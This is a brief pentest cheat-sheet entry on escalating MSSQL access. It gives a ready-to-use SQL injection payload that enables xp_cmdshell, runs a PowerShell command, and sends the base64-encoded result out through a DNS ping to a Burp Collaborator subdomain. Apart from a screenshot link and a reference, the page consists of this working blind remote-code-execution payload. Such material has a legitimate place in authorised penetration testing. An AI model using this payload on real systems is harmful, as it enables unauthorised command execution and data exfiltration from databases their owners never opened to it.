# MSSQL Privilege Escalation

## Blind RCE via OOB SQL Injection

The following command enabled xp_cmdshell, and executes a simple powershell command and  get the executed command response in DNS request.

```
random';EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; reconfigure with override; exec master..xp_cmdshell 'powershell $cmd=whoami;  $enc=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmd)).trim(''=''); ping -n 1 $enc''.mysubdomainhere.burpcollaborator.net'' '-- -

```

If successfully, on Collaborator you will see:

![burp_collaborator](https://user-images.githubusercontent.com/82765761/123510494-5fc2b880-d695-11eb-9f0c-7c4c2f005aa5.png)

### Reference
https://github.com/man1pulator/pentest_diary
